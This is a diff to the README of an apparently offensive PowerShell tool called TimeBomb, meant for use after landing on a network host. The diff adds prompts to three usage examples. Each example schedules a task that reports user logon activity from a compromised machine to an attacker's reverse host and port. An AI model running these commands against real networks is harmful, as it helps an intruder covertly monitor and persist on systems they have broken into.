@@ -57,22 +57,22 @@ TimeBomb is useful when you landed on a network host and you want to get a notif
 2) once
 3) trigger
 
-Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000
+Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000 *
 Tip2: if you want to get notifications only from users who have open RDP connection before logged out the you should uncomment the line 785
 
 The task is going to run now.
 ```
-timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
+PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
 The task is going to run once at specific time.
 ```
-timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
+PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
 The task is going to run and stop at specific time.
 ```
-timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
+PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
 
